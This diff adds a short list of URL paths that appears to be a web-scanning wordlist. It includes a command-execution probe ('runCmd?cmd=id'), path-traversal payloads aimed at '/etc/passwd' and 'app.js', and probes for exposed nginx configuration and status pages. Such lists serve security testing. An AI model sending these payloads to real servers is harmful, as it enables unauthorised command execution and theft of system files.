@@ -1,0 +1,13 @@
+/AdminPage/conf/runCmd?cmd=id
+{{paths}}
+///////../../../etc/passwd
+/static///////../../../../etc/passwd
+///../app.js
+/login
+/nginx.conf
+/nginx_status
+/nginx-status
+/status
+/dashboard.html
+/static/shards.html
+/static/shards/html
